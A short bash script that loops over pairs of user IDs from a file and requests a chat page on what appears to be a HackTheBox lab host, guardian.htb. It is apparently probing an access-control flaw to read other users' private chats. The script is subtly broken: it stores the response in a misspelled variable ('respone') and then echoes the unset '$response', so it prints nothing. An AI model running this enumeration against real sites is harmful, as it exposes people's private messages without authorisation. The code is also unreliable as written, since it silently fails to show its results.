#!/bin/bash
while IFS= read -r ID; do
  while IFS= read -r NUM; do
    respone=$(curl -g "http://portal.guardian.htb/student/chat.php?chat_users[0]=$ID&chat_users[1]=$NUM")
    echo "Response:"
    echo "$response"
  done < num.txt
done < num.txt

